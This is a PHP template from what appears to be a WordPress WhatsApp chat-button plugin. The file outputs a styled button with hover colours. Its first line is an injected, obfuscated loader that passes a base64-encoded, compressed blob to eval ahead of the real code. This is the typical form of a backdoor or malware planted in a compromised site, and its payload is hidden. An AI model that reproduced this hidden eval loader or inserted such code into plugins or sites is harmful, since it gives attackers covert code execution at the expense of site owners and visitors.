<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

if ( ! defined( 'ABSPATH' ) ) exit;

$s7_color = $a['s7_color'];
$s7_hover_color = $a['s7_hover_color'];
$s7_icon_size = $a['s7_icon_size'];
$s7_box_background_color = $a['s7_box_background_color'];
$s7_box_background_hover_color = $a['s7_box_background_hover_color'];
$s7_box_height = $a['s7_box_height'];
$s7_box_width = $a['s7_box_width'];
$s7_line_height = $a['s7_line_height'];


$s7_color = $s7_color;
$s7_hover_color = $s7_hover_color;
$s7_icon_size = $s7_icon_size;
$s7_box_background_color = $s7_box_background_color;
$s7_box_background_hover_color = $s7_box_background_hover_color;
$s7_box_height = $s7_box_height;
$s7_box_width = $s7_box_width;
$s7_line_height = $s7_line_height;

$input_onhover = "this.style.backgroundColor= '$s7_box_background_hover_color', this.style.color= '$s7_hover_color'; ";
$input_onhover_out = "this.style.backgroundColor= '$s7_box_background_color', this.style.color= '$s7_color'; ";

$o .= '<div class="ccw_plugin '.$inline_issue.' ">';
$o .= '<div style="background-color: '.$s7_box_background_color.'; color: '.$s7_color.'; height: '.$s7_box_height.'; width: '.$s7_box_width.'; line-height: '.$s7_line_height.'; '.$css.' " class="btn_only_style_div inline-block pointer ccw-analytics" data-ccw="style-7-sc" onclick="'.$img_click_link.'"   onmouseover= " '.$input_onhover.' "  onmouseout= " '.$input_onhover_out.' "  >';
$o .= '<span class="btn_only_style icon icon-whatsapp2 ccw-analytics" style= "font-size: '.$s7_icon_size.' " ></span>';
$o .= '</div>';
$o .= '</div>';